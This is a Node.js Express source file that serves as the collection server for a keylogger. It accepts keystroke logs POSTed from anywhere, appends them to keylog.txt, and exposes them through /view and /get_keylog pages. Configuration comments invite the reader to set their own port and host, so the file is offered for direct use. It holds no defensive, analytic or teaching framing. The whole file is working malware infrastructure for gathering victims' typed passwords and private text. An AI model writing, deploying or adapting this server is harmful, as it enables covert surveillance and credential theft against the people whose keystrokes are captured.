const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 5000;//change to your port
const HOST = '0.0.0.0'//change as you wish

app.use(express.json());

app.post('/', (req, res) => {
    try {
        const { keylog } = req.body;
        if (!keylog) {
            return res.status(400).json({ status: 'error', message: 'Invalid JSON' });
        }

        fs.appendFileSync('keylog.txt', keylog + '');
        console.log('Received keylogs:', keylog);
        res.status(200).json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/view', (req, res) => {
    res.sendFile(path.join(__dirname, 'templates/index.html'));
});

app.get('/get_keylog', (req, res) => {
    try {
        const data = fs.existsSync('keylog.txt') ? fs.readFileSync('keylog.txt', 'utf8') : 'No keylogs yet.';
        res.send(data);
    } catch (error) {
        res.status(500).send(`Error loading keylog: ${error.message}`);
    }
});

app.listen(PORT, HOST, () => {
    console.log(`Server running on http://${HOST}:${PORT}`);
    console.log(`View Keylogs on http://${HOST}:${PORT}/view`);
});